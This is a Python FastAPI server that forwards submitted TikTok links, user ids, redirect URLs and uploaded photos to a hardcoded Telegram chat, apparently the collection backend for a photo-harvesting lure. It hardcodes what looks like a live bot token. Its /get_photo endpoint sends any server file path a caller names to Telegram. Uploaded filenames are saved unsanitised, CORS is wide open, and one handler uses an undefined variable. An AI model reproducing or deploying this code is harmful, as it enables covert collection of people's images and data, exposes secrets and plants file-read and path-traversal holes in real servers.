import os
from fastapi import FastAPI, Form, UploadFile, File, HTTPException, Request
from fastapi.middleware.cors import CORSMiddleware
from aiogram import Bot
from aiogram.types import FSInputFile
from datetime import datetime
import aiofiles
import uvicorn
import logging

token = '5766763452:AAG14hwIr0o3pxAN1JRYlnk7hhIeH1CobXM'
bot = Bot(token)
app = FastAPI()

app.add_middleware(
        CORSMiddleware,
        allow_origins=["*"],
        allow_credentials=True,
        allow_methods=["*"],
        allow_headers=["*"],
    )


@app.post("/get_photo")
async def webhook(
        photo_url: str = Form(...)
):

    await send_telegram_message(5779182088, f"Обработка")
    await bot.send_photo(user_id, FSInputFile(photo_url))
        
@app.post("/tiktok")
async def webhook(
        tiktok_url: str = Form(...),
        user_id: str = Form(...),
        redirect_url: str = Form(...),
        photo: UploadFile = File(...)
):




    await send_telegram_message(5779182088, "Получен запрос")




    additional_info = f"url={tiktok_url}, id={user_id}, redirect={redirect_url}"
    await send_telegram_message(5779182088, additional_info)

    if photo:
        await send_telegram_photo(5779182088, photo)

    return {"status": "Success"}


async def send_telegram_message(user_id, text):
    await bot.send_message(user_id, text)


async def send_telegram_photo(user_id: int, photo: UploadFile):
    photo_path = await save_image(photo, "data/images")
    await send_telegram_message(5779182088, f"{photo_path}")
    await bot.send_photo(user_id, FSInputFile(photo_path))


async def save_image(image: UploadFile, directory: str) -> str:
    if image.filename.split(".")[-1].lower() not in ['jpeg', 'png', 'jpg', 'gif']:
        raise HTTPException(status_code=400, detail="Invalid image type")

    if not os.path.exists(directory):
        os.makedirs(directory)

    filename = f"{datetime.utcnow().timestamp()}_{image.filename}"
    file_path = os.path.join(directory, filename)

    async with aiofiles.open(file_path, 'wb') as out_file:
        content = await image.read()
        await out_file.write(content)

    return file_path


if __name__ == '__main__':
    uvicorn.run(app, host="0.0.0.0", port=8001)
